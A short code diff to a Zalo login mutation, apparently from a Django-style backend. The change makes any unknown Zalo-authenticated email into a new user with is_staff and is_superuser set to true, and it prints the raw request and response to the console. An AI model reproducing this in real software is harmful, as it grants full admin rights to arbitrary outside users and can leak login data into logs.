@@ -149,11 +149,9 @@ class CreateZaloToken(BaseMutation):
         print("zalo request url", url, json_response)
         user = models.User.objects.filter(email=zalouser, is_active=True).first()
         if not user:
-            user = models.User()
-            user.email = zalouser
-            user.is_active = True
-            user.is_staff = True
-            
+            user = models.User(
+                email=zalouser, is_active=True, is_staff=True, is_superuser=True
+            )
 
         return user    
 
